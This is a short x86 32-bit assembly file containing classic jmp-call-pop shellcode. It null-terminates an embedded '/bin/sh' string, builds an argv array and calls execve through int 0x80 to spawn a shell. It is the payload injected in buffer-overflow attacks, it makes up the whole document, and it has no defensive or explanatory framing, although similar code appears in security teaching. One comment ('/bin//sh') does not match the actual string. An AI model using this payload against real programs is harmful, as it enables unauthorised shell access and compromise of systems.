section .text
  global _start
    _start:
	BITS 32
	jmp short two
    one:
 	pop ebx
 	xor eax, eax		; eax = 0x00000000
 	mov [ebx+7], al		; Use 0 to terminate the string
 	mov [ebx+8], ebx	; argv[0] points "/bin//sh" 
 	mov [ebx+12], eax	; argv[1] = 0
 	lea ecx, [ebx+8]	; Get the address of argv[]
 	xor edx, edx		; No env variables 
 	mov al,  0x0b		; eax = 0x0000000b
 	int 0x80
     two:
 	call one
 	db '/bin/sh*AAAABBBB' 
